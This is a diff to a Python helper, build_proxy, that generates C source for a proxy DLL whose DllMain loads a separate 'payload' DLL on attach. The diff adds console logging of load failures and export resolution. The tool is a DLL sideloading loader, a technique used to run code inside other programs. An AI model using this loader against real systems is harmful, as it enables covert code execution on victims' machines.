@@ -74,26 +74,48 @@ def build_proxy(real_payload_path, build_dir, cc, export_name="Trigger", console
     src = os.path.join(build_dir, "proxy.c")
     dll = os.path.join(build_dir, "proxy.dll")
 
+    console_init = ""
+    call_init = ""
+    load_code = f'        LoadLibraryA("{real_name}");\n'
     if console:
         console_init = '''#include <stdio.h>
+#include <stdarg.h>
+#include <direct.h>
+static void logf(const char *fmt, ...) {
+    va_list ap;
+    va_start(ap, fmt);
+    vfprintf(stderr, fmt, ap);
+    va_end(ap);
+    fflush(stderr);
+}
 static void init_console(void) {
-    AllocConsole();
+    if (!AllocConsole()) return;
     freopen("CONOUT$", "w", stdout);
     freopen("CONOUT$", "w", stderr);
     freopen("CONIN$", "r", stdin);
 }
 '''
         call_init = "        init_console();\n"
-    else:
-        console_init = ""
-        call_init = ""
+        load_code = f'''        HMODULE payload = LoadLibraryA("{real_name}");
+        if (!payload) {{
+            logf("[proxy] FAILED to load {real_name}: error 0x%08lx\\n", GetLastError());
+            logf("[proxy] current dir: %s\\n", _getcwd(NULL, 0));
+        }} else {{
+            logf("[proxy] loaded {real_name} -> 0x%p\\n", (void *)payload);
+            FARPROC fn = GetProcAddress(payload, "{export_name}");
+            if (fn) {{
+                logf("[proxy] {export_name} resolved -> 0x%p\\n", (void *)fn);
+            }} else {{
+                logf("[proxy] {export_name} not exported (DllMain-only payload?)\\n");
+            }}
+        }}
+'''
 
     code = f'''#include <windows.h>
-__declspec(dllexport) void __cdecl {export_name}(void) {{}}
-{console_init}BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {{
+{console_init}__declspec(dllexport) void __cdecl {export_name}(void) {{}}
+BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {{
     if (r == DLL_PROCESS_ATTACH) {{
-{call_init}        LoadLibraryA("{real_name}");
-    }}
+{call_init}{load_code}    }}
     return TRUE;
 }}
 '''
